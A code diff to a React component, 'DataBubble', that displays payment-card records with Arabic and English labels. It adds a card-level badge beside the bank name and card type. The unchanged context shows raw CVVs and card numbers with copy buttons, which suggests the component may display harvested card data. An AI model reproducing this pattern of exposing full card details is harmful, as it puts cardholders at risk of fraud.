@@ -236,6 +236,14 @@ export function DataBubble({
     const cvv = rawCvv || "•••"
     const holderName = data["اسم حامل البطاقة"] || data["Card Holder"] || "CARD HOLDER"
     const cardType = (data["نوع البطاقة"] || data["Card Type"] || "CARD").toString().trim()
+    const cardLevel = (
+      data["مستوى البطاقة"] ||
+      data["Card Level"] ||
+      data["Level"] ||
+      ""
+    )
+      .toString()
+      .trim()
     const bankName = data["البنك"] || data["Bank"] || "بنك غير محدد"
     const bankCountry = data["بلد البنك"] || data["Country"] || ""
     const typeLower = cardType.toLowerCase()
@@ -344,6 +352,14 @@ export function DataBubble({
                   {copiedField === "cardNumber" ? "✓ تم" : "نسخ"}
                 </button>
               </div>
+              <div className="mt-2 rounded-lg border border-white/25 bg-white/15 px-2 py-1 text-[11px] backdrop-blur-sm">
+                <div className="flex items-center justify-between gap-2">
+                  <span className="truncate font-semibold">{bankName}</span>
+                  <span className="shrink-0 text-[10px] opacity-90">
+                    {[cardType, cardLevel].filter(Boolean).join(" • ")}
+                  </span>
+                </div>
+              </div>
             </div>
 
             {/* Bottom Section */}
@@ -402,6 +418,11 @@ export function DataBubble({
           <span className="inline-flex items-center rounded-full bg-gray-100 text-gray-700 border border-gray-200 px-2.5 py-1 text-xs font-semibold">
             {cardType}
           </span>
+          {cardLevel && (
+            <span className="inline-flex items-center rounded-full bg-amber-50 text-amber-700 border border-amber-200 px-2.5 py-1 text-xs font-semibold">
+              {cardLevel}
+            </span>
+          )}
         </div>
 
         {/* Footer - Status and Actions */}
